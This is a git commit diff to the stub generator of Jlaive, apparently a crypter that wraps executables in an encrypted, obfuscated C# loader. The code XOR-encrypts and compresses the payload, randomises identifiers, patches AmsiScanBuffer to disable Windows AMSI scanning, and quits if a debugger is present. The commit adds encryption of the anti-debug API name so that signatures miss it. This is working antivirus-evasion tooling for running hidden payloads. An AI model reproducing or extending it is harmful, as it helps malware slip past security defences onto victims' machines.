855d6f9922f29c8998d49b0d38bfe1349144b2ce
chash <70506265+ch2sh@users.noreply.github.com>
2022-05-12 16:02:43 +0800

    Update stub generation

--- Jlaive/StubGen.cs
+++ Jlaive/StubGen.cs
@@ -21,13 +21,16 @@ namespace Jlaive
 
         public static string CreateCS(byte[] pbytes, bool bamsi, bool antidebug, Random rng)
         {
-            string namespacename = RandomString(6, rng);
-            string classname = RandomString(6, rng);
-            string functionname = RandomString(6, rng);
-            string functionname2 = RandomString(6, rng);
+            string namespacename = RandomString(10, rng);
+            string classname = RandomString(10, rng);
+            string functionname = RandomString(10, rng);
+            string functionname2 = RandomString(10, rng);
+            string delegatename = RandomString(10, rng);
+            string delegatename2 = RandomString(10, rng);
             string key = RandomString(20, rng);
             string encrypted = Convert.ToBase64String(XORCrypt(Compress(pbytes), key));
             string encrypted2 = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), key));
+            string encrypted3 = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key));
             return @"using System;
 using System.Diagnostics;
 using System.Text;
@@ -46,25 +49,25 @@ namespace " + namespacename + @"
         [DllImport(""kernel32.dll"")]
         static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
-        delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-        delegate bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
+        " + (bamsi ? $"delegate bool {delegatename}(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);" : string.Empty) + @"
+        " + (antidebug ? $"delegate bool {delegatename2}(IntPtr hProcess, ref bool isDebuggerPresent);" : string.Empty) + @"
 
         static string payload = """ + encrypted + @""";
 
         static void Main(string[] args)
         {
-            IntPtr kmodule = LoadLibrary(""k"" + ""e"" + ""r"" + ""n"" + ""e"" + ""l"" + ""3"" + ""2"" + ""."" + ""d"" + ""l"" + ""l"");
+            " + (antidebug || bamsi ? @"IntPtr kmodule = LoadLibrary(""k"" + ""e"" + ""r"" + ""n"" + ""e"" + ""l"" + ""3"" + ""2"" + ""."" + ""d"" + ""l"" + ""l"");" : string.Empty) + @"
 
-            " + (antidebug ? 
-@"IntPtr crdpaddr = GetProcAddress(kmodule, ""CheckRemoteDebuggerPresent"");
-CheckRemoteDebuggerPresent CheckRemoteDebuggerPresent = (CheckRemoteDebuggerPresent)Marshal.GetDelegateForFunctionPointer(crdpaddr, typeof(CheckRemoteDebuggerPresent));
+            " + (antidebug ?
+@"IntPtr crdpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + functionname + @"(Convert.FromBase64String(""" + encrypted3 + @"""), """ + key + @""")));
+" + delegatename2 + @" CheckRemoteDebuggerPresent = (" + delegatename2 + @")Marshal.GetDelegateForFunctionPointer(crdpaddr, typeof(" + delegatename2 + @"));
 bool isDebuggerPresent = false;
 CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
 if (Debugger.IsAttached || isDebuggerPresent) Environment.Exit(1);" : string.Empty) + @"
 
-            " + (bamsi ? 
+            " + (bamsi ?
             @"IntPtr vpaddr = GetProcAddress(kmodule, ""V"" + ""i"" + ""r"" + ""t"" + ""u"" + ""a"" + ""l"" + ""P"" + ""r"" + ""o"" + ""t"" + ""e"" + ""c"" + ""t"");
-            VirtualProtect VirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(VirtualProtect));
+            " + delegatename + @" VirtualProtect = (" + delegatename + @")Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(" + delegatename + @"));
             IntPtr amsimodule = LoadLibrary(""a"" + ""m"" + ""s"" + ""i"" + ""."" + ""d"" + ""l"" + ""l"");
             IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(" + functionname + @"(Convert.FromBase64String(""" + encrypted2 + @"""), """ + key + @""")));
 
